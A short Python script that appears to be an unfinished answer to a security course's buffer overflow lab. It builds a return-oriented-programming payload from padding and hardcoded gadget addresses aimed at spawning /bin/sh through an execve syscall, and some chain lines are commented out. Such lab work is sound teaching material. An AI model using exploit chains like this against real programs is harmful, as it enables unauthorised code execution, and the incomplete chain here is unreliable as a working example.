#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
offset = 104 #100 (buffer) + 4 (ebp)

sys_execve = 0xb
pop_eax_ret = 0x80a8646
filename = "/bin/sh"
pop_ebx_ret = 0x80628a9
pop_edx_ret = 0x805cca8
int0x80 = 0x806e780


payload = b"A" * 104
#payload += pack('<I', pop_eax_ret)
#payload += pack('<I', sys_execve)
payload += pack('<I', pop_edx_ret)

payload += pack('<I', 0x806e780)
sys.stdout.buffer.write(payload)
